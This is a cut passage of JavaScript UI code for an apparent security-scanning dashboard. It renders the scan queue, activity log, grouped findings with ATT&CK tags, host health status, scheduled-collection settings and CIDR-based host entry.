        <section class="panel">
          <div class="panel-head"><h3>By environment</h3></div>
          ${profileBars(s.hosts_by_env)}
        </section>
      </div>`;
  }

  function hostsMini() {
    if (!state.hosts.length) return `<div class="empty">No hosts yet — add one from Hosts.</div>`;
    return `<table class="data"><thead><tr><th>Host</th><th>Addr</th><th>Last outcome</th></tr></thead><tbody>
      ${state.hosts.slice(0, 10).map((h) => `<tr data-host="${esc(h.id)}">
        <td><strong>${esc(h.display_name)}</strong></td>
        <td class="mono">${esc(h.primary_addr || "—")}:${h.ssh_port || 22}</td>
        <td>${esc(h.last_outcome || "never scanned")}</td>
      </tr>`).join("")}
    </tbody></table>`;
  }

  function queue() {
    const q = state.queue || {};
    const active = q.active || [];
    const nodes = state.nodes || [];
    return `
      <div class="stats">
        <div class="stat"><div class="label">Queued</div><div class="value">${q.queued ?? 0}</div></div>
        <div class="stat"><div class="label">Leased</div><div class="value">${q.leased ?? 0}</div></div>
        <div class="stat warn"><div class="label">Running</div><div class="value">${q.running ?? 0}</div></div>
        <div class="stat"><div class="label">Complete / failed</div><div class="value">${q.complete ?? 0} / ${q.failed ?? 0}</div></div>
      </div>
      <div class="grid-2">
        <section class="panel">
          <div class="panel-head"><h3>Active jobs</h3></div>
          ${!active.length ? `<div class="empty">Queue empty — simulator will top up shortly</div>` : `
          <table class="data"><thead><tr>
            <th>Host</th><th>Set</th><th>State</th><th>Stage</th><th>Progress</th>
          </tr></thead><tbody>
            ${active.map((j) => {
              const pct = j.progress_pct ?? 0;
              return `<tr>
                <td><strong>${esc(hostName(j.host_id))}</strong><div class="mono muted">${esc(shortId(j.id))}</div></td>
                <td>${esc(j.check_set)}</td>
                <td><span class="pill neutral">${esc(j.state)}</span></td>
                <td class="mono">${esc(j.progress_stage || "—")}</td>
                <td>
                  <div class="bar" style="background:#e8f0ed;height:8px"><span style="width:${pct}%;display:block;height:100%;background:linear-gradient(90deg,#0d7a66,#1ec9a5)"></span></div>
                  <div class="muted mono" style="font-size:0.72rem;margin-top:0.25rem">${pct}%</div>
                </td>
              </tr>`;
            }).join("")}
          </tbody></table>`}
        </section>
        <section class="panel">
          <div class="panel-head"><h3>Nodes / queues</h3></div>
          ${!nodes.length ? `<div class="empty">No nodes registered</div>` : `
          <table class="data"><thead><tr><th>Node</th><th>Region</th><th>Status</th></tr></thead><tbody>
            ${nodes.map((n) => `<tr>
              <td><strong>${esc(n.name || n.id)}</strong><div class="mono muted">${esc(shortId(n.id))}</div></td>
              <td>${esc(n.region || n.labels?.region || "—")}</td>
              <td><span class="pill neutral">${esc(n.status || "online")}</span></td>
            </tr>`).join("")}
          </tbody></table>`}
        </section>
      </div>`;
  }

  function activity() {
    const rows = state.activity || [];
    const lvl = state._actLevel || "";
    const filtered = lvl ? rows.filter((e) => e.level === lvl) : rows;
    return `<section class="panel">
      <div class="panel-head">
        <h3>Operator activity <span class="muted">(${filtered.length})</span></h3>
        <div class="toolbar">
          <select id="actLevel">
            <option value="">All levels</option>
            ${["info","progress","warn","error"].map((l) =>
              `<option value="${l}" ${lvl === l ? "selected" : ""}>${l}</option>`).join("")}
          </select>
          <button class="btn ghost" id="btnActRefresh">Refresh</button>
        </div>
      </div>
      ${!filtered.length ? `<div class="empty">No activity events</div>` : `
      <table class="data activity-table"><thead><tr>
        <th>Time</th><th>Level</th><th>Kind</th><th>Message</th><th>Host</th>
      </tr></thead><tbody>
        ${filtered.map((e) => `<tr>
          <td class="mono muted">${esc(fmtTime(e.ts))}</td>
          <td class="level-${esc(e.level || "info")}">${esc(e.level)}</td>
          <td class="mono">${esc(e.kind)}</td>
          <td>${esc(e.message)}</td>
          <td>${e.host_id ? esc(hostName(e.host_id)) : "—"}</td>
        </tr>`).join("")}
      </tbody></table>`}
    </section>`;
  }

  function findingSortTs(f) {
    const when = findingWhen(f);
    const raw = when.finished || when.seen || f.last_seen || f.first_seen || "";
    const d = parseTs(raw);
    return d ? d.getTime() : 0;
  }

  function findingsSorted(rows) {
    return (rows || []).slice().sort((a, b) => {
      const dt = findingSortTs(b) - findingSortTs(a);
      if (dt !== 0) return dt;
      return String(b.id || "").localeCompare(String(a.id || ""));
    });
  }

  const SEV_RANK = { critical: 5, high: 4, medium: 3, low: 2, info: 1 };

  function findingSevRank(s) {
    return SEV_RANK[String(s || "info").toLowerCase()] || 0;
  }

  function findingHostRecord(f) {
    return state.hostById[f.host_id] || null;
  }

  function findingHostTagList(f) {
    const h = findingHostRecord(f);
    return h ? hostTags(h) : [];
  }

  function findingMatchesFilters(f) {
    const q = (state._findQ || "").trim().toLowerCase();
    const sevF = (state._findSev || "").toLowerCase();
    const hostF = state._findHost || "";
    const tagF = (state._findTag || "").toLowerCase();
    const checkF = state._findCheck || "";
    if (sevF && String(f.severity).toLowerCase() !== sevF) return false;
    if (hostF && String(f.host_id) !== String(hostF)) return false;
    if (checkF && String(f.check_id) !== String(checkF)) return false;
    if (tagF) {
      const tags = findingHostTagList(f).map((t) => t.toLowerCase());
      if (!tags.some((t) => t === tagF || t.includes(tagF))) return false;
    }
    if (q) {
      const h = findingHostRecord(f);
      const hay = [
        f.title, f.check_id, f.severity, f.status, f.host_id, f.scan_id,
        hostName(f.host_id),
        h?.display_name, h?.primary_addr, h?.os, h?.os_id, h?.kernel,
        ...(f.attack || []),
        ...findingHostTagList(f),
        JSON.stringify(f.evidence || {}),
      ].filter(Boolean).join(" ").toLowerCase();
      if (!hay.includes(q)) return false;
    }
    return true;
  }

  function filteredFindingsList() {
    return findingsSorted((state.findings || []).filter(findingMatchesFilters));
  }

  /** Same alert on one host across scans → one group. */
  function groupFindingsByAlert(rows) {
    const map = new Map();
    for (const f of rows) {
      const key = `${f.host_id || "?"}::${f.check_id || "?"}`;
      let g = map.get(key);
      if (!g) {
        g = {
          key,
          host_id: f.host_id,
          check_id: f.check_id,
          title: f.title,
          severity: f.severity,
          attack: f.attack || [],
          findings: [],
          scanIds: new Set(),
        };
        map.set(key, g);
      }
      g.findings.push(f);
      if (f.scan_id) g.scanIds.add(String(f.scan_id));
      if (findingSevRank(f.severity) > findingSevRank(g.severity)) {
        g.severity = f.severity;
      }
      if (findingSortTs(f) >= findingSortTs(g.findings[0] || f)) {
        g.title = f.title || g.title;
        g.attack = f.attack?.length ? f.attack : g.attack;
      }
    }
    const groups = [...map.values()].map((g) => {
      g.findings = findingsSorted(g.findings);
      g.latest = g.findings[0];
      g.first = g.findings[g.findings.length - 1];
      g.count = g.findings.length;
      g.scanCount = g.scanIds.size;
      g.sortTs = findingSortTs(g.latest);
      return g;
    });
    groups.sort((a, b) => {
      const sev = findingSevRank(b.severity) - findingSevRank(a.severity);
      if (sev !== 0) return sev;
      return b.sortTs - a.sortTs;
    });
    return groups;
  }

  function groupFindingsByHost(rows) {
    const map = new Map();
    for (const f of rows) {
      const key = String(f.host_id || "unknown");
      if (!map.has(key)) map.set(key, []);
      map.get(key).push(f);
    }
    return [...map.entries()]
      .map(([host_id, findings]) => ({
        key: `host:${host_id}`,
        host_id,
        findings: findingsSorted(findings),
        count: findings.length,
        sortTs: Math.max(...findings.map(findingSortTs), 0),
      }))
      .sort((a, b) => b.count - a.count || b.sortTs - a.sortTs);
  }

  function groupFindingsByCheck(rows) {
    const map = new Map();
    for (const f of rows) {
      const key = String(f.check_id || "unknown");
      if (!map.has(key)) map.set(key, []);
      map.get(key).push(f);
    }
    return [...map.entries()]
      .map(([check_id, findings]) => ({
        key: `check:${check_id}`,
        check_id,
        title: findings[0]?.title || check_id,
        severity: findings.reduce(
          (best, f) => (findingSevRank(f.severity) > findingSevRank(best) ? f.severity : best),
          findings[0]?.severity
        ),
        findings: findingsSorted(findings),
        count: findings.length,
        hostCount: new Set(findings.map((f) => f.host_id)).size,
        sortTs: Math.max(...findings.map(findingSortTs), 0),
      }))
      .sort((a, b) => findingSevRank(b.severity) - findingSevRank(a.severity) || b.count - a.count);
  }

  function findingsFilterOptions() {
    const hosts = new Map();
    const tags = new Set();
    const checks = new Map();
    for (const f of state.findings || []) {
      if (f.host_id && !hosts.has(String(f.host_id))) {
        hosts.set(String(f.host_id), hostName(f.host_id));
      }
      for (const t of findingHostTagList(f)) tags.add(t);
      if (f.check_id && !checks.has(String(f.check_id))) {
        checks.set(String(f.check_id), f.title || f.check_id);
      }
    }
    return {
      hosts: [...hosts.entries()].sort((a, b) => a[1].localeCompare(b[1])),
      tags: [...tags].sort((a, b) => a.localeCompare(b)),
      checks: [...checks.entries()].sort((a, b) => String(a[0]).localeCompare(String(b[0]))),
    };
  }

  function findingsSevCounts(rows) {
    const c = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    for (const f of rows) {
      const k = String(f.severity || "info").toLowerCase();
      if (c[k] != null) c[k] += 1;
      else c.info += 1;
    }
    return c;
  }

  function findings() {
    const q = state._findQ || "";
    const sevF = state._findSev || "";
    const hostF = state._findHost || "";
    const tagF = state._findTag || "";
    const checkF = state._findCheck || "";
    const group = state._findGroup || "alert";
    const opts = findingsFilterOptions();
    const allRows = state.findings || [];
    const rows = filteredFindingsList();
    const sevCounts = findingsSevCounts(allRows);
    const filteredCounts = findingsSevCounts(rows);
    const activeFilters = [q, sevF, hostF, tagF, checkF].filter(Boolean).length;

    let pageItems = [];
    let totalUnits = 0;
    let bodyHtml = "";

    if (group === "all") {
      totalUnits = rows.length;
      const start = state.findPage * state.pageSize;
      pageItems = rows.slice(start, start + state.pageSize);
      bodyHtml = findingsTable(pageItems);
    } else if (group === "alert") {
      const groups = groupFindingsByAlert(rows);
      totalUnits = groups.length;
      const start = state.findPage * state.pageSize;
      pageItems = groups.slice(start, start + state.pageSize);
      bodyHtml = findingsAlertGroupsHtml(pageItems);
    } else if (group === "host") {
      const groups = groupFindingsByHost(rows);
      totalUnits = groups.length;
      const start = state.findPage * state.pageSize;
      pageItems = groups.slice(start, start + state.pageSize);
      bodyHtml = findingsHostGroupsHtml(pageItems);
    } else if (group === "check") {
      const groups = groupFindingsByCheck(rows);
      totalUnits = groups.length;
      const start = state.findPage * state.pageSize;
      pageItems = groups.slice(start, start + state.pageSize);
      bodyHtml = findingsCheckGroupsHtml(pageItems);
    }

    const unitLabel = group === "all" ? "findings" : group === "alert" ? "alerts" : group === "host" ? "hosts" : "checks";

    return `
      <div class="stack findings-page">
        <div class="stats findings-sev-stats">
          <button type="button" class="stat findings-sev-chip ${!sevF ? "active" : ""}" data-find-sev="">
            <div class="label">Shown</div>
            <div class="value">${rows.length.toLocaleString()}</div>
            <div class="hint">${allRows.length.toLocaleString()} total${activeFilters ? ` · ${activeFilters} filter${activeFilters === 1 ? "" : "s"}` : ""}</div>
          </button>
          ${["critical", "high", "medium", "low"].map((s) => `
            <button type="button" class="stat findings-sev-chip ${s === "critical" ? "crit" : s === "high" ? "high" : s === "medium" ? "warn" : ""} ${sevF === s ? "active" : ""}" data-find-sev="${s}">
              <div class="label">${s}</div>
              <div class="value">${(filteredCounts[s] ?? 0).toLocaleString()}</div>
              <div class="hint">${(sevCounts[s] ?? 0).toLocaleString()} overall</div>
            </button>`).join("")}
        </div>
        <section class="panel">
          <div class="panel-head findings-head">
            <div>
              <h3>Findings <span class="muted">(${totalUnits.toLocaleString()} ${unitLabel})</span></h3>
              <p class="muted findings-sub">Same check on one host is grouped across scans by default.</p>
            </div>
            <div class="toolbar findings-toolbar">
              <input id="findQ" placeholder="Search title, host, evidence…" value="${esc(q)}" />
              <select id="findSev" title="Severity">
                <option value="">All severities</option>
                ${["critical", "high", "medium", "low", "info"].map((s) =>
                  `<option value="${s}" ${sevF === s ? "selected" : ""}>${s}</option>`).join("")}
              </select>
              <select id="findHost" title="Hostname">
                <option value="">All hosts</option>
                ${opts.hosts.map(([id, name]) =>
                  `<option value="${esc(id)}" ${hostF === id ? "selected" : ""}>${esc(name)}</option>`).join("")}
              </select>
              <select id="findTag" title="Host tag">
                <option value="">All tags</option>
                ${opts.tags.map((t) =>
                  `<option value="${esc(t)}" ${tagF === t ? "selected" : ""}>${esc(t)}</option>`).join("")}
              </select>
              <select id="findCheck" title="Check">
                <option value="">All checks</option>
                ${opts.checks.map(([id, title]) =>
                  `<option value="${esc(id)}" ${checkF === id ? "selected" : ""}>${esc(id)}${title && title !== id ? ` — ${esc(String(title).slice(0, 40))}` : ""}</option>`).join("")}
              </select>
              <select id="findGroup" title="Group by">
                <option value="alert" ${group === "alert" ? "selected" : ""}>Group: alert × host</option>
                <option value="all" ${group === "all" ? "selected" : ""}>Flat list</option>
                <option value="host" ${group === "host" ? "selected" : ""}>Group: by host</option>
                <option value="check" ${group === "check" ? "selected" : ""}>Group: by check</option>
              </select>
              ${activeFilters || group !== "alert" ? `<button type="button" class="btn ghost" id="btnFindClear">Reset</button>` : ""}
            </div>
          </div>
          <div id="findingsBody">${bodyHtml}</div>
          ${pager("find", state.findPage, totalUnits, state.pageSize)}
        </section>
      </div>`;
  }

  function findingsTable(rows, opts) {
    const compact = !!(opts && opts.compact);
    const hideScan = !!(opts && opts.hideScan);
    const hideHost = !!(opts && opts.hideHost);
    if (!rows.length) {
      return `<div class="empty">${compact ? "No occurrences" : "No findings match these filters. Adjust search, severity, host, or tag."}</div>`;
    }
    return `<table class="data findings-table ${compact ? "findings-table-compact" : ""}"><thead><tr>
      <th>When</th><th>Severity</th><th>Title</th><th>Check</th>${hideHost ? "" : "<th>Host</th>"}${compact || hideHost ? "" : "<th>Tags</th>"}${hideScan ? "" : "<th>Scan</th>"}<th>ATT&CK</th><th></th>
    </tr></thead><tbody>
      ${rows.map((f) => {
        const href = `#finding/${encodeURIComponent(f.id)}`;
        const abs = findingPermalink(f.id);
        const hostHref = `#host/${encodeURIComponent(f.host_id)}`;
        const when = findingWhen(f);
        const tags = findingHostTagList(f);
        const scanHref = f.scan_id ? `#/scans/${encodeURIComponent(f.scan_id)}` : "";
        return `<tr data-fid="${esc(f.id)}">
        <td class="mono muted finding-when">${esc(fmtWhen(when.finished || when.seen))}</td>
        <td>${sev(f.severity)}</td>
        <td><a class="finding-link" href="${esc(href)}" data-fid-link="${esc(f.id)}">${esc(f.title)}</a></td>
        <td><span class="pill">${esc(f.check_id)}</span></td>
        ${hideHost ? "" : `<td><a class="finding-link" href="${esc(hostHref)}" data-goto-host="${esc(f.host_id)}">${esc(hostName(f.host_id))}</a></td>`}
        ${compact || hideHost ? "" : `<td class="findings-tags">${tags.length ? tags.slice(0, 4).map((t) => `<span class="tag">${esc(t)}</span>`).join("") : "—"}</td>`}
        ${hideScan ? "" : `<td class="mono">${scanHref
          ? `<a class="finding-link" href="${esc(scanHref)}" data-open-scan="${esc(f.scan_id)}">${esc(shortId(f.scan_id))}</a>`
          : "—"}</td>`}
        <td>${(f.attack || []).map((a) =>
          `<a class="tag" href="${esc(attackUrl(a))}" target="_blank" rel="noreferrer" data-stop>${esc(a)}</a>`
        ).join(" ") || "—"}</td>
        <td class="row-actions">
          <a class="btn ghost tiny" href="${esc(href)}" data-fid-link="${esc(f.id)}" title="Open finding">Open</a>
          <button type="button" class="btn ghost tiny" data-copy-finding="${esc(abs)}" title="Copy direct link">Link</button>
        </td>
      </tr>`;
      }).join("")}
    </tbody></table>`;
  }

  function findingsAlertGroupsHtml(groups) {
    if (!groups.length) {
      return `<div class="empty">No alerts match these filters.</div>`;
    }
    const expanded = state._findExpanded || {};
    return `<div class="findings-groups">${groups.map((g) => {
      const open = !!expanded[g.key];
      const latest = g.latest || g.findings[0];
      const first = g.first || g.findings[g.findings.length - 1];
      const whenLatest = findingWhen(latest);
      const whenFirst = findingWhen(first);
      const tags = findingHostTagList(latest);
      const href = `#finding/${encodeURIComponent(latest.id)}`;
      const hostHref = `#host/${encodeURIComponent(g.host_id)}`;
      return `<article class="finding-group ${open ? "open" : ""}" data-find-group-key="${esc(g.key)}">
        <div class="finding-group-main">
          <div class="finding-group-sev">${sev(g.severity)}</div>
          <div class="finding-group-body">
            <div class="finding-group-title">
              <a class="finding-link" href="${esc(href)}" data-fid-link="${esc(latest.id)}">${esc(g.title || g.check_id)}</a>
              ${g.count > 1 ? `<span class="finding-count" title="Seen across ${g.scanCount} scan(s)">${g.count}×</span>` : ""}
            </div>
            <div class="finding-group-meta">
              <a class="finding-link" href="${esc(hostHref)}" data-goto-host="${esc(g.host_id)}">${esc(hostName(g.host_id))}</a>
              <span class="sep">·</span>
              <span class="pill">${esc(g.check_id)}</span>
              <span class="sep">·</span>
              <span class="muted">${g.scanCount} scan${g.scanCount === 1 ? "" : "s"}</span>
              ${tags.length ? `<span class="sep">·</span><span class="findings-tags">${tags.slice(0, 3).map((t) => `<span class="tag">${esc(t)}</span>`).join("")}</span>` : ""}
            </div>
            <div class="finding-group-times muted mono">
              last ${esc(fmtWhen(whenLatest.finished || whenLatest.seen))}
              ${g.count > 1 ? ` · first ${esc(fmtWhen(whenFirst.finished || whenFirst.seen))}` : ""}
            </div>
          </div>
          <div class="finding-group-actions">
            <a class="btn primary tiny" href="${esc(href)}" data-fid-link="${esc(latest.id)}">Open latest</a>
            ${g.count > 1
              ? `<button type="button" class="btn ghost tiny" data-toggle-find-group="${esc(g.key)}">${open ? "Hide" : "Show"} ${g.count}</button>`
              : `<button type="button" class="btn ghost tiny" data-copy-finding="${esc(findingPermalink(latest.id))}">Link</button>`}
          </div>
        </div>
        ${open && g.count > 1 ? `<div class="finding-group-detail">${findingsTable(g.findings, { compact: true })}</div>` : ""}
      </article>`;
    }).join("")}</div>`;
  }

  function findingsHostGroupsHtml(groups) {
    if (!groups.length) return `<div class="empty">No hosts match these filters.</div>`;
    const expanded = state._findExpanded || {};
    return `<div class="findings-groups">${groups.map((g) => {
      const isOpen = !!expanded[g.key];
      const sevBest = g.findings.reduce(
        (best, f) => (findingSevRank(f.severity) > findingSevRank(best) ? f.severity : best),
        g.findings[0]?.severity
      );
      const hostHref = `#host/${encodeURIComponent(g.host_id)}`;
      const tags = findingHostTagList(g.findings[0] || {});
      return `<article class="finding-group ${isOpen ? "open" : ""}">
        <div class="finding-group-main">
          <div class="finding-group-sev">${sev(sevBest)}</div>
          <div class="finding-group-body">
            <div class="finding-group-title">
              <a class="finding-link" href="${esc(hostHref)}" data-goto-host="${esc(g.host_id)}">${esc(hostName(g.host_id))}</a>
              <span class="finding-count">${g.count} finding${g.count === 1 ? "" : "s"}</span>
            </div>
            <div class="finding-group-meta">
              ${tags.length ? tags.slice(0, 5).map((t) => `<span class="tag">${esc(t)}</span>`).join("") : `<span class="muted">No tags</span>`}
            </div>
          </div>
          <div class="finding-group-actions">
            <button type="button" class="btn ghost tiny" data-toggle-find-group="${esc(g.key)}">${isOpen ? "Collapse" : "Expand"}</button>
          </div>
        </div>
        ${isOpen ? `<div class="finding-group-detail">${findingsTable(g.findings.slice(0, 40), { compact: true })}</div>` : ""}
      </article>`;
    }).join("")}</div>`;
  }

  function findingsCheckGroupsHtml(groups) {
    if (!groups.length) return `<div class="empty">No checks match these filters.</div>`;
    const expanded = state._findExpanded || {};
    return `<div class="findings-groups">${groups.map((g) => {
      const isOpen = !!expanded[g.key];
      return `<article class="finding-group ${isOpen ? "open" : ""}">
        <div class="finding-group-main">
          <div class="finding-group-sev">${sev(g.severity)}</div>
          <div class="finding-group-body">
            <div class="finding-group-title">
              <span class="pill">${esc(g.check_id)}</span>
              <a class="finding-link" href="#finding/${encodeURIComponent(g.findings[0].id)}" data-fid-link="${esc(g.findings[0].id)}">${esc(g.title)}</a>
              <span class="finding-count">${g.count}×</span>
            </div>
            <div class="finding-group-meta muted">
              ${g.hostCount} host${g.hostCount === 1 ? "" : "s"}
            </div>
          </div>
          <div class="finding-group-actions">
            <button type="button" class="btn ghost tiny" data-toggle-find-group="${esc(g.key)}">${isOpen ? "Hide" : "Show"} hosts</button>
          </div>
        </div>
        ${isOpen ? `<div class="finding-group-detail">${findingsTable(g.findings.slice(0, 50), { compact: true })}</div>` : ""}
      </article>`;
    }).join("")}</div>`;
  }

  function isAgentLiteHost(h) {
    const kind = String(h?.agent_kind || "").toLowerCase();
    return kind === "agentlite" || kind === "agent_lite" || kind === "lite"
      || String(h?.labels?.scan_mode || "").toLowerCase() === "ssh_commands";
  }

  const SCAN_INTERVAL_OPTIONS = ["5m", "15m", "30m", "1h", "6h", "12h", "24h", "7d"];

  function isManualScanInterval(v) {
    const s = String(v || "").trim().toLowerCase();
    return !s || s === "manual" || s === "off" || s === "none" || s === "disabled" || s === "0";
  }

  function hostScanIntervalLabel(h) {
    const v = h?.labels?.scan_interval;
    if (isManualScanInterval(v)) return "Manual only";
    return String(v).trim();
  }

  function scanIntervalOptionsHtml(selected, { includeManual = true, fleetHint = "" } = {}) {
    const cur = String(selected || "").trim();
    const manualSel = includeManual && isManualScanInterval(cur) ? "selected" : "";
    const fleet = fleetHint || state.settings?.effective?.scan_interval || "1h";
    let html = includeManual
      ? `<option value="manual" ${manualSel}>Manual only (Scan now)</option>`
      : "";
    for (const v of SCAN_INTERVAL_OPTIONS) {
      html += `<option value="${esc(v)}" ${cur === v ? "selected" : ""}>${esc(v)}${v === fleet ? " (fleet cadence)" : ""}</option>`;
    }
    return html;
  }

  function autoCollectFieldsHtml({ labels = {}, idPrefix = "autoCollect", showCheckbox = true } = {}) {
    const interval = String(labels.scan_interval || "manual").trim() || "manual";
    const enabled = !isManualScanInterval(interval);
    const fleet = state.settings?.effective?.scan_interval || "1h";
    const selectVal = enabled ? interval : fleet;
    return `
      <fieldset class="ssh-auth-fields" style="border:0;margin:0 0 0.85rem;padding:0">
        <legend style="font-size:0.85rem;margin-bottom:0.25rem;font-weight:600">Automatic collection</legend>
        ${showCheckbox ? `
        <label class="rules-enable" style="display:flex;gap:0.5rem;align-items:center;margin:0.25rem 0">
          <input type="checkbox" name="auto_collect" id="${esc(idPrefix)}Enable" ${enabled ? "checked" : ""} />
          Enable scheduled collection
        </label>` : ""}
        <div id="${esc(idPrefix)}IntervalWrap" class="${enabled || !showCheckbox ? "" : "hidden"}" style="margin-top:0.45rem">
          <label>Collection interval
            <select name="scan_interval" id="${esc(idPrefix)}Interval">
              ${showCheckbox
                ? SCAN_INTERVAL_OPTIONS.map((v) => `<option value="${esc(v)}" ${selectVal === v ? "selected" : ""}>${esc(v)}${v === fleet ? " (fleet cadence)" : ""}</option>`).join("")
                : scanIntervalOptionsHtml(interval, { includeManual: true, fleetHint: fleet })}
            </select>
          </label>
        </div>
        <p class="muted" style="margin:0.35rem 0 0;font-size:0.75rem">
          New hosts stay <strong>manual</strong> until you enable this. Use <strong>Scan now</strong> anytime.
        </p>
      </fieldset>`;
  }

  function wireAutoCollectToggle(idPrefix = "autoCollect") {
    const enable = $(`#${idPrefix}Enable`);
    const wrap = $(`#${idPrefix}IntervalWrap`);
    if (!enable || !wrap) return;
    const sync = () => wrap.classList.toggle("hidden", !enable.checked);
    enable.addEventListener("change", sync);
    sync();
  }

  function applyAutoCollectFromForm(fd, labelsOut, { checkboxMode = false } = {}) {
    const fleet = state.settings?.effective?.scan_interval || "1h";
    if (checkboxMode) {
      if (fd.get("auto_collect")) {
        const v = String(fd.get("scan_interval") || fleet).trim();
        labelsOut.scan_interval = isManualScanInterval(v) ? fleet : v;
      } else {
        labelsOut.scan_interval = "manual";
      }
      return;
    }
    const v = String(fd.get("scan_interval") || "manual").trim();
    labelsOut.scan_interval = isManualScanInterval(v) ? "manual" : v;
  }

  function isVirtualHost(h) {
    return String(h?.agent_kind || "").toLowerCase() === "virtual"
      || String(h?.auth_status || "").toLowerCase() === "virtual";
  }

  function hostStatus(h) {
    const auth = String(h.auth_status || "").toLowerCase();
    const checkedMs = h.auth_checked_at ? Date.parse(h.auth_checked_at) : NaN;
    const checkedAge = Number.isFinite(checkedMs) ? Date.now() - checkedMs : Infinity;
    const intervalSec = Number(state.settings?.effective?.host_health_interval_secs || 60);
    const staleMs = Math.max(3 * intervalSec, 180) * 1000;
    const stale = checkedAge > staleMs;
    const detail = h.auth_detail || "";

    if (auth === "ok" || auth === "partial") {
      if (stale && Number.isFinite(checkedMs)) {
        return { key: "offline", label: "Offline", auth: detail || "health check stale" };
      }
      return { key: "active", label: "Active", auth: detail || (auth === "ok" ? "SSH reachable" : "login not tested") };
    }
    if (auth === "virtual" || String(h.agent_kind || "").toLowerCase() === "virtual") {
      return { key: "active", label: "Virtual", auth: detail || "log ingest only" };
    }
    if (auth === "unreachable" || auth === "no_sshd") {
      return { key: "offline", label: "Offline", auth: detail || auth.replace(/_/g, " ") };
    }
    if (auth === "auth_failed") {
      return { key: "inactive", label: "Inactive", auth: detail || "auth failed" };
    }
    if (auth === "no_credential") {
      return {
        key: "inactive",
        label: "Inactive",
        auth: detail || "no credential",
      };
    }
    const outcome = String(h.last_outcome || "").toLowerCase();
    if (!outcome && !auth) {
      return {
        key: "inactive",
        label: "Inactive",
        auth: detail || "never checked",
      };
    }
    if (
      outcome.includes("fail")
      || outcome.includes("unreach")
      || outcome.includes("auth")
      || outcome.includes("timeout")
      || outcome.includes("refus")
    ) {
      return { key: "inactive", label: "Inactive", auth: h.last_outcome };
    }
    const ts = h.last_scan_at ? Date.parse(h.last_scan_at) : NaN;
    if (Number.isFinite(ts) && Date.now() - ts > 24 * 3600 * 1000) {
      return { key: "offline", label: "Offline", auth: h.last_outcome };
    }
    if (outcome) {
      return { key: "active", label: "Active", auth: h.last_outcome };
    }
    return { key: "inactive", label: "Inactive", auth: detail || "never checked" };
  }

  function hostTags(h) {
    const labels = h.labels || {};
    const tags = [];
    if (labels.tags) {
      String(labels.tags).split(/[,;]+/).map((t) => t.trim()).filter(Boolean).forEach((t) => tags.push(t));
    }
    ["env", "profile", "region", "credential"].forEach((k) => {
      if (labels[k]) tags.push(`${k}:${labels[k]}`);
    });
    return [...new Set(tags)];
  }

  function selectedHostIds() {
    return new Set(state._selectedHosts || []);
  }

  function setSelectedHosts(ids) {
    state._selectedHosts = [...ids];
  }

  function filteredHosts() {
    const q = String(state._hostQ || "").toLowerCase().trim();
    const tokens = q ? q.split(/\s+/).filter(Boolean) : [];
    const env = state._hostEnv || "";
    const profile = state._hostProfile || "";
    const preset = state._hostPreset || "";
    const osId = state._hostOs || "";
    const arch = state._hostArch || "";
    const agent = String(state._hostAgent || "").toLowerCase();
    return (state.hosts || []).filter((h) => {
      if (preset) {
        const st = hostStatus(h);
        if (preset === "active" && st.key !== "active") return false;
        if (preset === "inactive" && st.key !== "inactive") return false;
        if (preset === "offline" && st.key !== "offline") return false;
      }
      if (agent) {
        const a = hostAgentInfo(h).id;
        if (agent === "ssh" && a !== "ssh") return false;
        if (agent === "agentlite" && a !== "agentlite") return false;
        if (agent === "virtual" && a !== "virtual") return false;
      }
      if (env && h.labels?.env !== env) return false;
      if (profile && h.labels?.profile !== profile) return false;
      if (osId && (h.os_id || "") !== osId) return false;
      if (arch && (h.arch || "") !== arch) return false;
      if (!tokens.length) return true;
      const labels = h.labels || {};
      const tagBits = [];
      if (labels.tags) tagBits.push(String(labels.tags));
      if (labels.tag) tagBits.push(String(labels.tag));
      if (labels.env) tagBits.push(String(labels.env));
      if (labels.profile) tagBits.push(String(labels.profile));
      if (labels.region) tagBits.push(String(labels.region));
      const hay = [
        h.display_name || "",
        h.id || "",
        h.primary_addr || "",
        h.os || "",
        h.os_id || "",
        h.os_version || "",
        h.arch || "",
        h.kernel || "",
        h.agent_kind || "",
        hostAgentInfo(h).title,
        hostAgentInfo(h).detail,
        tagBits.join(" "),
      ].join(" ").toLowerCase();
      return tokens.every((t) => hay.includes(t));
    });
  }

  function expandHostLines(text) {
    const lines = String(text || "")
      .split(/\n+/)
      .map((s) => s.trim())
      .filter(Boolean);
    const out = [];
    const errors = [];
    for (const line of lines) {
      const cidr = line.match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
      if (!cidr) {
        out.push(line);
        continue;
      }
      const prefix = Number(cidr[2]);
      if (prefix < 16 || prefix > 32) {
        errors.push(`${line}: only /16–/32 netblocks supported`);
        continue;
      }
      const parts = cidr[1].split(".").map(Number);
      if (parts.some((n) => n > 255)) {
        errors.push(`${line}: invalid IPv4`);
        continue;
      }
      const base = ((parts[0] << 24) >>> 0) + ((parts[1] << 16) >>> 0) + ((parts[2] << 8) >>> 0) + (parts[3] >>> 0);
      const mask = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
      const network = (base & mask) >>> 0;
      const size = 2 ** (32 - prefix);
      if (size > 65536) {
        errors.push(`${line}: exceeds class B (65535 hosts)`);
        continue;
      }
      // Skip network + broadcast for prefixes < 31
      const start = prefix >= 31 ? 0 : 1;
      const end = prefix >= 31 ? size : size - 1;
      for (let i = start; i < end; i++) {
        const ip = (network + i) >>> 0;
        out.push([
          (ip >>> 24) & 255,
          (ip >>> 16) & 255,
          (ip >>> 8) & 255,
          ip & 255,
        ].join("."));
      }
    }
    return { hosts: [...new Set(out)], errors };
  }

  function hosts() {
    const envs = [...new Set(state.hosts.map((h) => h.labels?.env).filter(Boolean))].sort();
    const profiles = [...new Set(state.hosts.map((h) => h.labels?.profile).filter(Boolean))].sort();
    const osIds = [...new Set(state.hosts.map((h) => h.os_id).filter(Boolean))].sort();
    const archs = [...new Set(state.hosts.map((h) => h.arch).filter(Boolean))].sort();
    const rows = filteredHosts();
    const start = state.hostPage * state.pageSize;
    const pageRows = rows.slice(start, start + state.pageSize);
    const selected = selectedHostIds();
    const pageIds = pageRows.map((h) => h.id);
    const allPageSelected = pageIds.length > 0 && pageIds.every((id) => selected.has(id));
    const statusCounts = { active: 0, inactive: 0, offline: 0 };
    state.hosts.forEach((h) => { statusCounts[hostStatus(h).key] += 1; });
    const selCount = selected.size;
    return `
      <div class="stack">
        <div class="stats">
          <div class="stat"><div class="label">Total</div><div class="value">${state.hosts.length.toLocaleString()}</div></div>
